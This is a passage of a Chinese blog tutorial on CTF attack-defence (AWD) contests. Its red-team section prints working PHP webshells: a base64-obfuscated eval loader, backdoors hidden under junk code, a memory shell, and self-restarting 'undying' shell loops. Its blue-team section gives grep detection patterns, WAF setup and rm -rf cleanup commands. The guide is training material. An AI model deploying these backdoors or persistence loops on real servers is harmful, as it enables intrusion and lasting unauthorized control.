+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    nohup php -S 0.0.0.0:1234 -t /var/www/html <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl">    sleep <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><pre><code>  **特点**：
+  - 循环重启后门
+  - 对手杀一个，立刻起十个
+</code></pre>
+</li>
+<li>
+<p>三、混淆干扰实战（心态攻防，让对手修不动）<br>
+攻防赛里：
+<strong>打得下靶机不算厉害，让对手修不好才是真赢！</strong></p>
+<ul>
+<li>
+<ol>
+<li>代码混淆（让对手看不懂）
+把一句话木马变成乱码，对手找不到漏洞点：</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nx">strrev</span><span class="p">(</span><span class="s2">&#34;edoced_4esab&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nv">$a</span><span class="p">(</span><span class="s2">&#34;cGhwIGV2YWwoJF9QT1NUWydjbWQnXSk7&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>解密后：<code>eval($_POST[cmd])</code></p>
+<ul>
+<li>
+<ol start="2">
+<li>垃圾填充干扰（让对手改不动）
+在源码里插入 <strong>10000行无效代码</strong>：</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 一万行垃圾代码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$a</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$a</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$a</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$a</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$a</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// ... 重复一万行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="c1">// 后门藏在最深处
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>对手审计源码直接崩溃！</p>
+<ul>
+<li>
+<ol start="3">
+<li>批量生成假后门（钓鱼干扰）
+写 100 个假后门，<strong>只有 1 个是真的</strong>：</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nv">$a</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="err"> // 假
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php $b=2; ?&gt; // 假
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php eval($_POST[cmd]); ?&gt; // 真
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>对手疯狂删假后门，<strong>真后门一直拿 Flag</strong>！</p>
+</li>
+<li>
+<p>四、红队攻击完整流程（AWD 实战模板）</p>
+<ul>
+<li>
+<ol>
+<li>打进靶机</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SQL注入 / 文件上传 / 弱口令 → 拿 Webshell
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="2">
+<li>写入内存马 + 不复用 Shell</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">register_shutdown_function</span><span class="p">(</span><span class="k">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;/var/www/html/.config.php&#39;</span><span class="p">,</span><span class="s1">&#39;&lt;?php @$_SERVER[&#34;HTTP_USER_AGENT&#34;]();?&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="3">
+<li>部署不死马</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nohup bash -c <span class="s1">&#39;while true; do php -r &#34;eval(\$_POST[1]);&#34;; sleep 5; done&#39;</span> <span class="p">&amp;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="4">
+<li>开启混淆干扰</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// 插入10000行垃圾代码
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="5">
+<li>自动 Flag 挂机</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 自动拿 Flag + 自动提交</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">get_flag</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">submit</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>超简总结（背会上场直接用）</p>
+<ol>
+<li><strong>不复用 Shell = 无文件、无端口、无痕隐藏</strong></li>
+<li><strong>内存马 / 不死马 = 删不掉、杀不死、永久控机</strong></li>
+<li><strong>混淆干扰 = 让对手找不到、修不好、心态崩</strong></li>
+<li><strong>红队核心：打得进、留得住、干扰得了！</strong></li>
+</ol>
+</li>
+</ul>
+</li>
+<li>-CTF 攻防模式（AWD）蓝队防守终极手册<br>
+这是 <strong>AWD 线下赛生存、翻盘、抗住攻击的核心手册</strong>。<br>
+红队是进攻，蓝队是<strong>防守、反杀、清马、保分</strong>。<br>
+蓝队全套技能：
+<ul>
+<li>短文件快速定位（找木马）</li>
+<li>WAF 部署（拦攻击）</li>
+<li>Web 流量监控（查攻击者）</li>
+<li>文件监控（防篡改）</li>
+<li>不死马 / 内存马彻底清理（真清除）</li>
+<li>一、蓝队核心目标
+<ol>
+<li><strong>保证靶机不宕机</strong></li>
+<li><strong>保证自己不掉分</strong></li>
+<li><strong>让对手删不掉马、修不了漏洞</strong></li>
+<li><strong>反制攻击者（反打、拉黑、溯源）</strong></li>
+</ol>
+</li>
+<li>二、短文件快速定位实战（找木马最快方法）<br>
+比赛开始后 1 分钟必须做：<strong>快速定位恶意文件</strong>
+<ul>
+<li>
+<ol>
+<li>查找所有 PHP 一句话木马特征
+直接搜索关键字：</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -r <span class="s2">&#34;eval(&#34;</span> /var/www/html/
+</span></span><span class="line"><span class="cl">grep -r <span class="s2">&#34;assert(&#34;</span> /var/www/html/
+</span></span><span class="line"><span class="cl">grep -r <span class="s2">&#34;system(&#34;</span> /var/www/html/
+</span></span><span class="line"><span class="cl">grep -r <span class="s2">&#34;shell_exec(&#34;</span> /var/www/html/
+</span></span><span class="line"><span class="cl">grep -r <span class="s2">&#34;base64_decode&#34;</span> /var/www/html/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="2">
+<li>查找隐藏文件（AWD 红队最爱藏）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find /var/www/html -name <span class="s2">&#34;.*.php&#34;</span>
+</span></span><span class="line"><span class="cl">find /var/www/html -name <span class="s2">&#34;.*.php&#34;</span>
+</span></span><span class="line"><span class="cl">find /var/www/html -name <span class="s2">&#34;*.php~&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="3">
+<li>查找最近修改的文件（10 分钟内被修改）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find /var/www/html -mtime -1 -ls
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="4">
+<li>查找大小异常的文件</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls -lh /var/www/html <span class="p">|</span> grep -E <span class="s2">&#34;[0-9]+M&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>三、WAF 部署实战（拦攻击、保分）
+<ul>
+<li>
+<ol>
+<li>一键部署 Nginx + WAF（ModSecurity）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install nginx libmodsecurity-modsecurity-nginx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="2">
+<li>启用 Core Rule Set（CRS）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo cp /usr/share/modsecurity-crs/crs-setup.conf.example /etc/modsecurity/crs-setup.conf
+</span></span><span class="line"><span class="cl">sudo cp /usr/share/modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example /etc/modsecurity/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="3">
+<li>启用 WAF（关键）
+编辑 <code>/etc/nginx/nginx.conf</code>：</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">modsecurity on;
+</span></span><span class="line"><span class="cl">modsecurity_rules_file /etc/modsecurity/crs-setup.conf;
+</span></span></code></pre></td></tr></table>
+</div>
+</div>重启 Nginx：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">systemctl restart nginx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="4">
+<li>效果</li>
+</ol>
+<ul>
+<li>拦截 SQL 注入</li>
+<li>拦截 XSS</li>
+<li>拦截 RCE</li>
+<li>拦截一句话木马</li>
+<li>拦截内存马写入</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>四、Web 流量监控（实时查攻击者）
+<ul>
+<li>
+<ol>
+<li>实时查看 Nginx 访问日志</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tail -f /var/log/nginx/access.log
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="2">
+<li>统计攻击 IP（谁在打你）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">awk <span class="s1">&#39;{print $1}&#39;</span> /var/log/nginx/access.log <span class="p">|</span> sort <span class="p">|</span> uniq -c <span class="p">|</span> sort -nr
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="3">
+<li>统计恶意请求（含 cmd、eval、system）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -E <span class="s2">&#34;cmd|eval|system|base64&#34;</span> /var/log/nginx/access.log
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="4">
+<li>直接拉黑攻击 IP（iptables）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">iptables -A INPUT -s 192.168.1.100 -j DROP
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>五、文件监控实战（防止被改写、被删）
+<ul>
+<li>
+<ol>
+<li>安装 inotifywait（实时监控）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install inotify-tools
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="2">
+<li>一键启动监控脚本（AWD 必备）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">inotifywait -m -e create -e modify -e delete /var/www/html --timefmt <span class="s1">&#39;%F %T&#39;</span> --format <span class="s1">&#39;%T %w %f %e&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="3">
+<li>自动恢复文件（被删就还原）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    inotifywait -e delete /var/www/html
+</span></span><span class="line"><span class="cl">    cp /var/www/html/backup/* /var/www/html/
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>六、不死马 / 内存马彻底清理实战（关键！）<br>
+红队上传的<strong>不死马、内存马、无文件 Shell</strong>，普通删除根本清不掉！<br>
+<strong>完整清理流程:</strong>
+<ul>
+<li>第一步：停止 Web 服务（彻底断马）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">systemctl stop nginx
+</span></span><span class="line"><span class="cl">systemctl stop php7.4-fpm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第二步：强制删除所有可疑 PHP 文件</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm -rf /var/www/html/*.php
+</span></span><span class="line"><span class="cl">rm -rf /var/www/html/./*.php
+</span></span><span class="line"><span class="cl">rm -rf /var/www/html/*/*.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第三步：清理内存马（进程守护马）
+查看所有 PHP 进程：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ps -aux <span class="p">|</span> grep php
+</span></span></code></pre></td></tr></table>
+</div>
+</div>强制杀死：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">kill</span> -9 进程号
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第四步：清理定时任务（不死马克星）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">crontab -e
+</span></span></code></pre></td></tr></table>
+</div>
+</div>删除所有包含 <code>php</code>、<code>curl</code>、<code>wget</code> 的任务。
+<ul>
+<li>第五步：恢复干净源码（从备份覆盖）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/html
+</span></span><span class="line"><span class="cl">rm -rf ./*
+</span></span><span class="line"><span class="cl">unzip /root/web_backup.zip -d /var/www/html/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第六步：重启 Web 服务</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">systemctl start nginx
+</span></span><span class="line"><span class="cl">systemctl start php7.4-fpm
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>七、蓝队防御完整流程（背下来！）
+<ol>
+<li><strong>改密码</strong>（后台+数据库+SSH）</li>
+<li><strong>备份源码</strong>（被黑能恢复）</li>
+<li><strong>扫描端口</strong>（防反连）</li>
+<li><strong>部署 WAF</strong>（拦截攻击）</li>
+<li><strong>监控日志</strong>（找攻击者）</li>
+<li><strong>文件监控</strong>（防篡改）</li>
+<li><strong>清理不死马/内存马</strong>（全流程清干净）</li>
+<li><strong>开启自动恢复</strong>（防再被写马）</li>
+</ol>
+</li>
+<li>超简总结（背会直接上场）
+<ul>
+<li><strong>短文件定位 = 1 分钟找木马</strong></li>
+<li><strong>WAF = 拦截攻击、保分</strong></li>
+<li><strong>流量监控 = 溯源、反打</strong></li>
+<li><strong>文件监控 = 防被篡改</strong></li>
+<li><strong>不死马清理 = 停服务 + 全删 + 恢复源码</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CTF真题讲解与训练</li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Loyal
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/lloyal-sudo01/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
